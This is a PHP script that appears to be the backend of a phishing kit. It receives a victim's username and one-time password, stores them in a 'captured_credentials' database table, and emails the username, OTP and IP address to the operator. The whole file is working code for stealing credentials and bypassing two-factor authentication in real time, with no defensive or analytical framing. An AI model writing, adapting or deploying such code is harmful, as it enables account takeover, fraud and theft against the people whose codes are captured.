<?php
require_once 'db_connect.php';

$data = json_decode(file_get_contents('php://input'), true);

$stmt = $conn->prepare("UPDATE captured_credentials SET 
    otp = ?, 
    otp_captured_at = NOW() 
    WHERE username = ? ORDER BY id DESC LIMIT 1");
$stmt->bind_param("ss", $data['otp'], $data['username']);
$stmt->execute();

// Email alert
$to = "your@email.com";
$subject = "OTP Captured";
$message = "Username: {$data['username']}\nOTP: {$data['otp']}\nIP: {$data['ip']}";
mail($to, $subject, $message);

echo json_encode(['status' => 'success']);
?>